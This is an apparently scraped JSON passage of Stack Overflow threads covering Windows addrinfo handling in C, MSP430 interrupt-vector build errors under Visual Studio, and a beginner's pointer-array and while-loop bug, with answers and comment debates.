addrinfo struct gets corrupted. But heap is still valid", "body": "<p>Your <code>lookup_host()</code> is not returning address data back to the caller correctly, not even close.  <code>addrinfo</code> contains pointers to data outside of the <code>addrinfo</code>.  But you are just copying the <code>addrinfo</code> itself to the caller, but none of the data it points at.</p>\n\n<p>Try something more like this instead:</p>\n\n<pre><code>int lookup_host(const wchar_t *host, int family, void *sa)\n{\n    struct addrinfoW hints;\n    struct addrinfoW *res, *addr;\n    int errcode, addrlen, returnval;\n    void *ptr;\n\n    ZeroMemory(&amp;hints, sizeof(hints));\n    hints.ai_family = family;\n    hints.ai_socktype = SOCK_STREAM;\n\n    errcode = GetAddrInfoW(host, L\"80\", &amp;hints, &amp;res);\n    //GetAddrInfoExW(host, L\"80\", NS_ALL, NULL, &amp;hints, &amp;res, NULL, NULL, NULL, NULL);\n    if (errcode != 0)\n    {\n        //perror(\"getaddrinfo\");\n        return -1;\n    }\n\n    returnval = 0;\n\n    for(addr = res; addr != NULL; addr = addr-&gt;ai_next)\n    {\n        switch (addr-&gt;ai_family)\n        {\n            case AF_INET:\n                ptr = &amp;((struct sockaddr_in *) addr-&gt;ai_addr)-&gt;sin_addr;\n                addrlen = sizeof(struct sockaddr_in);\n                break;\n\n            case AF_INET6:\n                ptr = &amp;((struct sockaddr_in6 *) res-&gt;ai_addr)-&gt;sin6_addr;\n                addrlen = sizeof(struct sockaddr_in6);\n                break;\n\n            default:\n                continue;\n        }\n\n        CopyMemory(sa, ptr, addrlen);\n        returnval = 1;\n        break;\n    }\n\n    FreeAddrInfoW(res);\n\n    return returnval;\n}\n\n...\n\nstruct sockaddr_in sa;\n\nif (lookup_host(host, AF_INET, &amp;sa) != 1) {\n    return -1;\n}\n\nSOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\nif (sock == INVALID_SOCKET) {\n    return -1;\n}\n\nif (connect(sock, (struct sockaddr *)&amp;sa, sizeof(sa)) &lt; 0) {\n    #ifdef _DEBUG\n    printf(\"Error: %d\\n\", GetLastError());\n    #endif // _DEBUG\n\n    closesocket(sock);\n    return -2;\n}\n\n...\n</code></pre>\n\n<p>Note, however, that the above returns only the first address found.  A hostname can resolve to multiple IPs, and your PC might not have a route to all of them.  So, you should attempt to connect to every address reported until one is successful, eg:</p>\n\n<pre><code>int lookup_host(const wchar_t *host, int family, struct addrinfoW **addrs)\n{\n    struct addrinfoW hints;\n    int errcode;\n\n    ZeroMemory(&amp;hints, sizeof(hints));\n    hints.ai_family = family;\n    hints.ai_socktype = SOCK_STREAM;\n\n    errcode = GetAddrInfoW(host, L\"80\", &amp;hints, addrs);\n    //GetAddrInfoExW(host, L\"80\", NS_ALL, NULL, &amp;hints, addrs, NULL, NULL, NULL, NULL);\n    if (errcode != 0)\n    {\n        //perror(\"getaddrinfo\");\n        return -1;\n    }\n\n    return 0;\n}\n\n...\n\nstruct addrInfoW *res, *addr;\n\nif (lookup_host(host, AF_INET, &amp;res) &lt; 0) { // or AF_INET6, or AF_UNSPEC\n    return -1;\n}\n\nsock = INVALID_SOCKET;\n\nfor(addr = res; addr != NULL; addr = addr-&gt;ai_next)\n{\n    sock = socket(addr-&gt;ai_family, addr-&gt;ai_socktype, addr-&gt;ai_protocol);\n    if (sock == INVALID_SOCKET) {\n        break;\n    }\n\n    if (connect(sock, addr-&gt;ai_addr, addr-&gt;ai_addrlen) == 0) {\n        break;\n    }\n\n    #ifdef _DEBUG\n    printf(\"Error: %d\\n\", GetLastError());\n    #endif // _DEBUG\n\n    closesocket(sock);\n    sock = INVALID_SOCKET;\n}\n\nFreeAddrInfoW(res);\n\nif (sock == INVALID_SOCKET) {\n    return -2;\n}\n\n...\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 1636331, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1225ad94d7554e64e21262832182e387?s=128&d=identicon&r=PG", "display_name": "manner", "link": "https://stackoverflow.com/users/1636331/manner"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 118, "favorite_count": 0, "accepted_answer_id": 53300971, "answer_count": 3, "score": 2, "last_activity_date": 1542232320, "creation_date": 1542199686, "question_id": 53300622, "link": "https://stackoverflow.com/questions/53300622/c-addrinfo-struct-gets-corrupted-but-heap-is-still-valid", "title": "C addrinfo struct gets corrupted. But heap is still valid", "body": "<p>I try to create a socket and connect to a remote host. I resolve the remote host from domain with GetAddrInfo. Which works fine. After the call i get a working addrinfo struct with the right values. But in some situations the struct gets corrupted before calling connect().</p>\n\n<pre><code>struct addrinfoW sa = { 0 };\nZeroMemory(&amp;sa, sizeof(sa));\nlookup_host(host, &amp;sa);\n\nint sock = 0;\nsock = socket(AF_INET, SOCK_STREAM, 0);\nif(sock == -1) {\n    return -1;\n}\nHeapValidate(GetProcessHeap(), HEAP_NO_SERIALIZE, NULL);\nif(connect(sock, sa-&gt;ai_addr, sa-&gt;ai_addrlen) &lt; 0) {\n    HeapValidate(GetProcessHeap(), HEAP_NO_SERIALIZE, NULL);\n#ifdef _DEBUG\n    printf(\"Error: %d\\n\", GetLastError());\n#endif // _DEBUG\n\n    return -2;\n}\n</code></pre>\n\n<p>Where lookup_host is defined as:</p>\n\n<pre><code>struct addrinfoW hints = { 0 };\nstruct addrinfoW *res;\nint errcode;\nZeroMemory(&amp;hints, sizeof(struct addrinfoW));\n//ZeroMemory(res, sizeof(struct addrinfo));\nhints.ai_family = PF_UNSPEC;\nhints.ai_socktype = SOCK_STREAM;\nhints.ai_flags |= AI_CANONNAME;\nerrcode = GetAddrInfo(host, L\"80\", &amp;hints, &amp;res);//GetAddrInfoExW(L\"google.de\", L\"80\", NS_ALL, NULL, &amp;hints, &amp;res, NULL, NULL, NULL, NULL);  //GetAddrInfoEX(L\"google.de\", L\"80\", &amp;hints, &amp;res);\nwin_free(mbHost);\nif (errcode != 0)\n{\n    //perror(\"getaddrinfo\");\n    return -1;\n}\nvoid *ptr = 0;\nwhile (res)\n{\n    switch (res-&gt;ai_family)\n    {\n    case AF_INET:\n        ptr = &amp;((struct sockaddr_in *) res-&gt;ai_addr)-&gt;sin_addr;\n        break;\n    case AF_INET6:\n        ptr = &amp;((struct sockaddr_in6 *) res-&gt;ai_addr)-&gt;sin6_addr;\n        break;\n    }\n    CopyMemory(out, res, sizeof(struct addrinfoW));\n    break;\n    res = res-&gt;ai_next;\n}\nFreeAddrInfo(res);\n</code></pre>\n\n<p>So this works well on my Quad-Core Win10 laptop. But if i add for example a</p>\n\n<pre><code>MessageBoxA(NULL, \"After sock\", \"HTTP\", MB_ICONWARNING|MB_CANCELTRYCONTINUE | MB_DEFBUTTON2);\n</code></pre>\n\n<p>call before the connect() call and examine the addrinfo struct in debugger it gets corrupted. For example some time i can see that the ai_canonname which should be \"google.com\" get overwritten with \"After Sock\". But the heap is still valid after that. \nSo i have no idea where to start debugging this. Could it be some other buffer or struct which overflows somewhere? </p>\n"}, {"tags": ["c", "visual-studio", "msp430", "firmware", "visualgdb"], "comments": [{"owner": {"reputation": 157205, "user_id": 11654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/586424ca0847070dc1868aa58077003e?s=128&d=identicon&r=PG", "display_name": "CL.", "link": "https://stackoverflow.com/users/11654/cl"}, "edited": false, "score": 0, "creation_date": 1542204816, "post_id": 53300554, "comment_id": 93485058, "body": "<code>USCI_A0_VECTOR</code> should have the value 49. What is the version of your <code>msp430fr5729.h</code> file?"}, {"owner": {"reputation": 12417, "user_id": 942855, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/mq475.jpg?s=128&g=1", "display_name": "HaBo", "link": "https://stackoverflow.com/users/942855/habo"}, "reply_to_user": {"reputation": 157205, "user_id": 11654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/586424ca0847070dc1868aa58077003e?s=128&d=identicon&r=PG", "display_name": "CL.", "link": "https://stackoverflow.com/users/11654/cl"}, "edited": false, "score": 0, "creation_date": 1542210635, "post_id": 53300554, "comment_id": 93488840, "body": "@CL.I think its Version 1.23, updated the question with header info"}, {"owner": {"reputation": 157205, "user_id": 11654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/586424ca0847070dc1868aa58077003e?s=128&d=identicon&r=PG", "display_name": "CL.", "link": "https://stackoverflow.com/users/11654/cl"}, "edited": false, "score": 0, "creation_date": 1542211580, "post_id": 53300554, "comment_id": 93489443, "body": "That&#39;s the same version I have. And what is the value of <code>USCI_A0_VECTOR</code> (at the bottom)?"}, {"owner": {"reputation": 12417, "user_id": 942855, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/mq475.jpg?s=128&g=1", "display_name": "HaBo", "link": "https://stackoverflow.com/users/942855/habo"}, "reply_to_user": {"reputation": 157205, "user_id": 11654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/586424ca0847070dc1868aa58077003e?s=128&d=identicon&r=PG", "display_name": "CL.", "link": "https://stackoverflow.com/users/11654/cl"}, "edited": false, "score": 0, "creation_date": 1542212213, "post_id": 53300554, "comment_id": 93489836, "body": "@CL.#define USCI_A0_VECTOR      (0x0060) /* 0xFFF0 USCI A0 Receive/Transmit */"}, {"owner": {"reputation": 12417, "user_id": 942855, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/mq475.jpg?s=128&g=1", "display_name": "HaBo", "link": "https://stackoverflow.com/users/942855/habo"}, "reply_to_user": {"reputation": 157205, "user_id": 11654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/586424ca0847070dc1868aa58077003e?s=128&d=identicon&r=PG", "display_name": "CL.", "link": "https://stackoverflow.com/users/11654/cl"}, "edited": false, "score": 0, "creation_date": 1542213198, "post_id": 53300554, "comment_id": 93490461, "body": "@CL.its actually failing at 4 incidents for USCI_A0_VECTOR, USCI_A1_VECTOR and TIMER_A0_VECTOR, updated the question with all details"}, {"owner": {"reputation": 157205, "user_id": 11654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/586424ca0847070dc1868aa58077003e?s=128&d=identicon&r=PG", "display_name": "CL.", "link": "https://stackoverflow.com/users/11654/cl"}, "edited": false, "score": 0, "creation_date": 1542222527, "post_id": 53300554, "comment_id": 93495074, "body": "There are different .h files for the different compilers. Did you copy the fr5729.h from the old project?"}, {"owner": {"reputation": 12417, "user_id": 942855, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/mq475.jpg?s=128&g=1", "display_name": "HaBo", "link": "https://stackoverflow.com/users/942855/habo"}, "reply_to_user": {"reputation": 157205, "user_id": 11654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/586424ca0847070dc1868aa58077003e?s=128&d=identicon&r=PG", "display_name": "CL.", "link": "https://stackoverflow.com/users/11654/cl"}, "edited": false, "score": 0, "creation_date": 1542223488, "post_id": 53300554, "comment_id": 93495487, "body": "@CL I copied it. Now #define USCI_A0_VECTOR  (49) but still error interrupt&#39; attribute parameter 49 is out of bounds\tmsp430fr5729"}, {"owner": {"reputation": 157205, "user_id": 11654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/586424ca0847070dc1868aa58077003e?s=128&d=identicon&r=PG", "display_name": "CL.", "link": "https://stackoverflow.com/users/11654/cl"}, "edited": false, "score": 0, "creation_date": 1542224101, "post_id": 53300554, "comment_id": 93495769, "body": "Throw away all old files you did not write yourself; the new compiler should already have them."}], "owner": {"reputation": 12417, "user_id": 942855, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/mq475.jpg?s=128&g=1", "display_name": "HaBo", "link": "https://stackoverflow.com/users/942855/habo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 376, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1542213095, "creation_date": 1542199494, "last_edit_date": 1592644375, "question_id": 53300554, "link": "https://stackoverflow.com/questions/53300554/using-visual-studio-to-develop-msp430-firmware", "title": "Using Visual Studio to develop MSP430 firmware", "body": "<p>Hi am migrating a <code>Code Composer Studio</code> project to <code>Visual Studio 2017 (Visual GDB)</code></p>\n<p>I created a new sample project as explained <a href=\"https://visualgdb.com/tutorials/msp430/\" rel=\"nofollow noreferrer\">here</a> for MCU: <strong>MSP430 FR5729</strong></p>\n<p>Then included(copied) all <code>.c</code> and <code>.h</code> files to the <code>Source files</code> folder in my solution explorer</p>\n<p>When I try to build the project I get four errors</p>\n<blockquote>\n<p>'interrupt' attribute parameter 96 is out of bounds msp430fr5729</p>\n<p>'interrupt' attribute parameter 86 is out of bounds   msp430fr5729</p>\n<p>'interrupt' attribute requires an integer constant    msp430fr5729</p>\n<p>'interrupt' attribute requires an integer constant    msp430fr5729</p>\n</blockquote>\n<p>I have done similar migration for other MCU <strong>MSP430 F149</strong> and that worked like a charm.</p>\n<p>Here is the code segments where it throws errors</p>\n<blockquote>\n<p>'interrupt' attribute parameter 96 is out of bounds msp430fr5729</p>\n</blockquote>\n<pre><code>#if defined(__TI_COMPILER_VERSION__) || defined(__IAR_SYSTEMS_ICC__)\n#pragma vector=USCI_A0_VECTOR\n__interrupt void USCI_A0_ISR(void)\n#elif defined(__GNUC__)\n/**\n * \\brief \n */\nvoid __attribute__ ((interrupt(USCI_A0_VECTOR))) USCI_A0_ISR (void)\n#else\n#error Compiler not supported!\n#endif\n</code></pre>\n<p>msp430fr5729.h file contains</p>\n<pre><code>#define USCI_A0_VECTOR      (0x0060) /* 0xFFF0 USCI A0 Receive/Transmit */\n</code></pre>\n<blockquote>\n<p>'interrupt' attribute parameter 86 is out of bounds   msp430fr5729</p>\n</blockquote>\n<pre><code>#if defined(__TI_COMPILER_VERSION__) || defined(__IAR_SYSTEMS_ICC__)\n#pragma vector=USCI_A1_VECTOR\n__interrupt void USCI_A1_ISR(void)\n#elif defined(__GNUC__)\nvoid __attribute__ ((interrupt(USCI_A1_VECTOR))) USCI_A1_ISR (void)\n#else\n#error Compiler not supported!\n#endif\n</code></pre>\n<p>msp430fr5729.h file contains</p>\n<pre><code>#define USCI_A1_VECTOR      (0x0056) /* 0xFFE6 USCI A1 Receive/Transmit */\n</code></pre>\n<blockquote>\n<p>'interrupt' attribute requires an integer constant    msp430fr5729</p>\n</blockquote>\n<pre><code>#if defined(__TI_COMPILER_VERSION__) || defined(__IAR_SYSTEMS_ICC__)\n#pragma vector=TIMER0_A0_VECTOR\n__interrupt void Timer_A0 (void)\n#elif defined(__GNUC__)\nvoid __attribute__ ((interrupt(TIMER_A0_VECTOR))) Timer_A0 (void)\n#else\n#error Compiler not supported!\n#endif\n</code></pre>\n<p>msp430fr5729.h does not contain <strong>TIMER_A0_VECTOR</strong> defined</p>\n<blockquote>\n<p>'interrupt' attribute requires an integer constant    msp430fr5729</p>\n</blockquote>\n<pre><code>#if defined(__TI_COMPILER_VERSION__) || defined(__IAR_SYSTEMS_ICC__)\n#pragma vector=TIMER1_A0_VECTOR\n__interrupt void Timer1_A0 (void)\n#elif defined(__GNUC__)\nvoid __attribute__ ((interrupt(TIMER_A0_VECTOR))) Timer1_A0 (void)\n#else\n#error Compiler not supported!\n#endif\n</code></pre>\n<p>msp430fr5729.h does not contain <strong>TIMER_A0_VECTOR</strong> defined</p>\n<p>Any help would be greatly appreciated</p>\n<p>Version Info for <code>msp430fr5729.h</code></p>\n<pre><code>/********************************************************************\n*\n* Standard register and bit definitions for the Texas Instruments\n* MSP430 microcontroller.\n*\n* This file supports assembler and C development for\n* MSP430FR5729 devices.\n*\n* Texas Instruments, Version 1.23\n*\n* Rev. 1.0, Setup\n* Rev. 1.1  Fixed definition of RTCTEV__0000 and RTCTEV__1200\n*           Removed not availabe bits RTCMODE and RTCSSELx\n*           Added PxSELC registers\n* Rev. 1.2  Removed Port Drive Strenght Registers\n* Rev. 1.3  updated PxSELC register address to offset 0x16 (instead of 0x10)\n*\n********************************************************************/\n</code></pre>\n"}, {"tags": ["c", "while-loop", "boolean-expression"], "comments": [{"owner": {"reputation": 15373, "user_id": 822669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f66e2987d5d24e6d8a1f686154a51c21?s=128&d=identicon&r=PG", "display_name": "Sander De Dycker", "link": "https://stackoverflow.com/users/822669/sander-de-dycker"}, "edited": false, "score": 0, "creation_date": 1542205463, "post_id": 53300417, "comment_id": 93485461, "body": "<code>!((c &gt; a) &amp;&amp; (c &gt; b))</code> is equivalent to <code>((c &lt;= a) || (c &lt;= b))</code>, not to <code>((c &lt; a) &amp;&amp; (c &lt; b))</code>"}, {"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1542703164, "post_id": 53300417, "comment_id": 93653547, "body": "A <code>int *[]</code> is not an array of integers... but an array of <b>pointers to integers</b>.  You must drop the <code>*</code> in your declaration."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1542705268, "post_id": 53300417, "comment_id": 93654686, "body": "It looks like you forgot to enable a good set of warnings.  For GCC, I recommend <code>-Wall -Wextra -Wwrite-strings</code> as a minimum; consider also <code>-Wpedantic -Warray-bounds</code> for identifying some other common mistakes."}], "answers": [{"comments": [{"owner": {"reputation": 506, "user_id": 6655405, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/oqJAE.png?s=128&g=1", "display_name": "Stelios Papamichail", "link": "https://stackoverflow.com/users/6655405/stelios-papamichail"}, "edited": false, "score": 0, "creation_date": 1542199347, "post_id": 53300467, "comment_id": 93481521, "body": "Our teacher requested to use  an array of int pointers so i must use that. Is it wrong? I changed it earlier to an int array just out of curiosity and that didn&#39;t work either"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 506, "user_id": 6655405, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/oqJAE.png?s=128&g=1", "display_name": "Stelios Papamichail", "link": "https://stackoverflow.com/users/6655405/stelios-papamichail"}, "edited": false, "score": 1, "creation_date": 1542199508, "post_id": 53300467, "comment_id": 93481609, "body": "@SteliosPapamichail I dont see why&#39;d you need an array of pointers. However, I updated my answer a bit, check if it works."}, {"owner": {"reputation": 506, "user_id": 6655405, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/oqJAE.png?s=128&g=1", "display_name": "Stelios Papamichail", "link": "https://stackoverflow.com/users/6655405/stelios-papamichail"}, "edited": false, "score": 2, "creation_date": 1542199654, "post_id": 53300467, "comment_id": 93481683, "body": "it&#39;s probably used later on in the exercise :) . Your edit solved it and i see why i should have used <code>||</code> instead of <code>&amp;&amp;</code>. My bad and thanks for the help"}, {"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "reply_to_user": {"reputation": 506, "user_id": 6655405, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/oqJAE.png?s=128&g=1", "display_name": "Stelios Papamichail", "link": "https://stackoverflow.com/users/6655405/stelios-papamichail"}, "edited": false, "score": 0, "creation_date": 1542703382, "post_id": 53300467, "comment_id": 93653670, "body": "@SteliosPapamichail, an array of pointers is being filled with integer values.  Nothing wrong, but as they are integers, you must not consider them as pointers.  I don&#39;t fully understand the reasons your teacher argue to use pointers instead of integers, but you&#39;ll run into trouble and run into problems by using the wrong type to operate with numbers.  Pointers and numbers, are comparable, and you can do arithmetic with them.  But arithmetic and comparison rules differ between pointers and integers and you&#39;ll run into trouble for sure in the future."}, {"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1542705557, "post_id": 53300467, "comment_id": 93654870, "body": "@SouravGhosh, why do you say this code invokes Undefined Behaviour?  can you be more specific?"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1542705838, "post_id": 53300467, "comment_id": 93655051, "body": "@LuisColorado Sure, check the types, what is type of <code>side[i]</code>? What would be the type of <code>&amp;sides[i]</code>? and what <code>scanf()</code> expects as argument to <code>%d</code>? This type mismatch causes the UB. Better? :)"}, {"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1542706101, "post_id": 53300467, "comment_id": 93655218, "body": "yes... I&#39;ve checked... <code>%d</code> says to read a decimal ascii value and put the result in the place pointed to by the pointer.  I don&#39;t see a problem there.  You can initialise a pointer with an absolute address there, and as the pointer size is greater or equal than the integer size, I don&#39;t fully see the U.B. at all.  Possible to get a meaningles value as a pointer, but as he is using the data as integer, no U.B. results."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1542706278, "post_id": 53300467, "comment_id": 93655319, "body": "@LuisColorado <b>(1)</b> <code>and as the pointer size is greater or equal than the integer size</code> - that&#39;s your assumption, it&#39;s not mandated in the standard. <b>(2)</b> the spec mentions any type mismatch as UB. Check <code>C11</code>, chapter &#167;7.21.6.2/P10. <b>(3)</b> there is nothing called &quot;fully UB&quot;/ &quot;partially UB&quot;. It is either a defined behavior, implementation defined behavior or undefined. In this case, spec is explicit about the UB."}, {"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1542706804, "post_id": 53300467, "comment_id": 93655603, "body": "Not, it is not.... but tell me just one architecture that has integer larger than address types... I&#39;m not sure about your assertion anyway... I&#39;ve not read the standard recently, probably you can illustrate better than me on this point.  I cannot believe your assertion of <code>any type mismatch as UB</code>.  Does that mean that storing an <code>int</code> into a <code>long</code> to be a U.B?  (is a type mismatch, i&#39;m afraid the standard doesn&#39;t speak so vaguely as to say <i>any type mismatch is a U.B.</i>)"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1542707431, "post_id": 53300467, "comment_id": 93656002, "body": "@LuisColorado , yes, it would be UB. <code>long</code> and  <code>int</code> are <b>not</b> compatible types. That is why there are two seperate conversion specifiers, <code>%id</code> for <code>long</code> and <code>%d</code> for <code>int</code>. Mixing them up is not allowed and UB."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1542707468, "post_id": 53300467, "comment_id": 93656024, "body": "@LuisColorado the exact quote: <code>Unless assignment suppression was indicated by a *, the result of the conversion is placed in the object pointed to by the first argument following the format argument that has not already received a conversion result. If this object does not have an appropriate type, or if the result of the conversion cannot be represented in the object, the behavior is undefined.</code>"}], "tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": true, "score": 4, "last_activity_date": 1542199485, "last_edit_date": 1542199485, "creation_date": 1542199180, "answer_id": 53300467, "question_id": 53300417, "link": "https://stackoverflow.com/questions/53300417/bool-expression-seems-logical-but-doesnt-work/53300467#53300467", "title": "bool expression seems logical but doesn&#39;t work", "body": "<p>The main problem in your code is, it invokes <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\">undefined behavior</a>.</p>\n\n<p>To elaborate, in your code, by saying</p>\n\n<pre><code> int *sides[3];\n</code></pre>\n\n<p>you are defining an array of 3 <code>int *</code>s (array of 3 pointers to integer), whereas, what you need is an array of 3 <code>int</code>s. Change it to</p>\n\n<pre><code>int sides[3];\n</code></pre>\n\n<p>That said, based on your requirement, the <code>&amp;&amp;</code> in the <code>while</code> condition should be <code>||</code>, if you want to check for the third input to be the smallest.</p>\n"}, {"tags": [], "owner": {"reputation": 5339, "user_id": 1714692, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/bd72cbc200eb7c9aa507624f154b21a7?s=128&d=identicon&r=PG", "display_name": "Francesco Boi", "link": "https://stackoverflow.com/users/1714692/francesco-boi"}, "is_accepted": false, "score": 0, "last_activity_date": 1542200338, "creation_date": 1542200338, "answer_id": 53300829, "question_id": 53300417, "link": "https://stackoverflow.com/questions/53300417/bool-expression-seems-logical-but-doesnt-work/53300829#53300829", "title": "bool expression seems logical but doesn&#39;t work", "body": "<p>An array go given size is declared with:</p>\n\n<pre><code>int sides[3];\n</code></pre>\n\n<p>while an array of unknown size (a pointer basically) is declared with:</p>\n\n<pre><code>int* sides;//you should use malloc to allocate the array memory at run time.\n</code></pre>\n\n<p>Using </p>\n\n<p>int* sides[3];</p>\n\n<p>you are declaring an array of pointers.</p>\n\n<p>Your final code should look like:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void) { // Stelios Papamichail 4020\n    int sides[3];\n    int i;\n    for(i=0; i &lt; 3; i++) {\n        if(i == 2) {// third side\n            printf(\"%d %d %d\\n\", sides[i], sides[i-1], sides[i-2]);\n\n            scanf(\" %d\",&amp;sides[i]);\n            while((sides[i] &lt; sides[i-1]) &amp;&amp; (sides[i] &lt; sides[i-2])) {\n                printf(\"%d %d %d\\n\", sides[i-2], sides[i-1], sides[i]);\n                scanf(\" %d\",&amp;sides[i]);\n            }\n        } else {\n            printf(\"%d %d %d\\n\", sides[i-2], sides[i-1], sides[i]);\n            scanf(\" %d\",&amp;sides[i]);\n        }\n    }\n    return 0;\n}\n</code></pre>\n\n<p>I added some prints to understand what's going on.</p>\n"}, {"tags": [], "owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "is_accepted": false, "score": 1, "last_activity_date": 1542705472, "last_edit_date": 1592644375, "creation_date": 1542704951, "answer_id": 53389582, "question_id": 53300417, "link": "https://stackoverflow.com/questions/53300417/bool-expression-seems-logical-but-doesnt-work/53389582#53389582", "title": "bool expression seems logical but doesn&#39;t work", "body": "<p>You say:</p>\n<blockquote>\n<p>I'm reading 3 integers in my C program and storing them in an int *[]. While reading the 3rd int however, I want to compare it to the previous 2 and if it's greater than both of them the program ends, if it isn't the program will keep on reading the 3rd. input until it satisfies the condition in the while loop.</p>\n</blockquote>\n<p>well, an <code>int</code> is not the same as a pointer.  An <code>int</code> allows you to do integer arithmetic, while an <code>int *</code> allows you to do pointer arithmetic.  (the pointer stores the memory address of an <code>int</code> variable, and as such, when you increment it, it moves its value to the <em>next</em> address, which is not the same as adding one ---because an <code>int</code> needs more than one byte to fit in memory)  You can use <code>int *</code> in your program (as you say in the comments, your teacher has indicated that) but that's like making an omelette but using apples instead of eggs (well, they are both round, but the result is not the same).  I cannot guess the reason your teacher asked you to use <code>int *</code>, but that gives me warnings from the compiler, advising me of the risk of doing this (compiler is CLANG, on FreeBSD)</p>\n<blockquote>\n<p>My issue is, although the bool expression seems logical (to me at least) and the values I enter are successfully stored in the 